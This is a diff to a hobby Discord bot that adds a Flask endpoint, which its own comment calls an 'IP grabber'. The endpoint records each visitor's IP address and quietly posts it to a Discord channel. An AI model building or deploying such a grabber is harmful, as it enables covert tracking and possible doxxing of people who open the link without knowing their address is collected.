@@ -3,6 +3,9 @@ import discord
 import requests
 import xmltodict
 import datetime
+import threading
+import asyncio
+from flask import Flask, request, jsonify
 from dotenv import load_dotenv
 from discord.ext import commands
 from discord.ext import tasks
@@ -13,10 +16,37 @@ aboutTime = datetime.now()
 
 #API key retrevial from enviroment variable. Uses the python-dotenv library
 load_dotenv()
-api_key = os.getenv("API_KEY")
+API_KEY = os.getenv("API_KEY")
+DISCORD_CHANNEL_ID = os.getenv("DISCORD_CHANNEL_ID")
+OUTSIDE_PORT = os.getenv("OUTSIDE_PORT")
 
 # Get steam info in XML format
 STEAM_URL="https://steamcommunity.com/id/Henry1981?xml=1"
+
+# Initialize Flask app
+app = Flask(__name__)
+
+def send_ip_to_discord(ip):
+    channel = bot.get_channel(int(DISCORD_CHANNEL_ID))
+    if channel:
+        # Use the bot's API to send the message
+        asyncio.run_coroutine_threadsafe(
+            channel.send(f"New visitor IP: `{ip}`"),
+            bot.loop
+        )
+    else:
+        print("Channel not found. Is the bot connected?")
+
+@app.route("/ip", methods=["GET"])
+def get_ip():
+    forwarded = request.headers.get('X-Forwarded-For', request.remote_addr)
+    ip = forwarded.split(',')[0].strip()
+    send_ip_to_discord(ip)
+    return jsonify({"ip": ip})
+
+def run_flask():
+    app.run(host='0.0.0.0', port=OUTSIDE_PORT)
+
 
 def parse_xml_from_url_to_dict(STEAM_URL):
     """
@@ -137,8 +167,13 @@ async def kys(ctx):
     await bot.change_presence(status=discord.Status.offline, activity=discord.Activity(type=discord.ActivityType.listening, name="synergy"))
     await ctx.send('um what the flip man...... if youre happy then im happy i guess :((((((')
     await ctx.send('**you\'re')
-    
-    
-bot.run(api_key)
+
+#IP grabber shit
+
+
+# Run the bot
+if __name__ == "__main__":
+    threading.Thread(target=run_flask, daemon=True).start()
+    bot.run(API_KEY)
 
 #i love freaky bot ai....
